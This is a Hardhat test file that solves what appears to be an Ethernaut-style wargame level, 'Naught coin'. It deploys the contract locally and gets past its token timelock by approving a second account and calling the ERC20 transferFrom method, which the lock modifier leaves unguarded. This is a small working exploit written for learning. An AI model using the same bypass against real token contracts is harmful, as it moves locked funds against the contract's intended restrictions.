import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 15 - Naught coin contract hack", () => {
    async function setUp() {
        const [owner, ownerAssistant, target] = await ethers.getSigners();

        const NaughtCoinContract = await ethers.getContractFactory("NaughtCoin");
        const coin = await NaughtCoinContract.deploy(owner.address);

        return {owner, ownerAssistant, target, coin};
    };
    
    describe("When hacking", () => {
        it("Balance should transfer by allowed assistant", async() => {
            /*
             * Given the NaughtCoin contract timelock period, calling for the transfer method will revert.
             * However, the ERC20 standard provides a bypass through the transferFrom method.
             * Given that the transferFrom method is not modified by lockTokens, the hacker can bypass the timelock.
            **/
            const {owner, ownerAssistant, target, coin} = await loadFixture(setUp);

            expect(await coin.balanceOf(owner.address)).to.equal(ethers.parseEther("1000000"));

            await coin.connect(owner).approve(ownerAssistant.address, ethers.parseEther("1000000"));
            await coin.connect(ownerAssistant).transferFrom(owner.address, target.address, ethers.parseEther("1000000"));
            
            expect(await coin.balanceOf(owner.address)).to.equal("0");
            expect(await coin.balanceOf(target.address)).to.equal(ethers.parseEther("1000000"));
        });
    });
});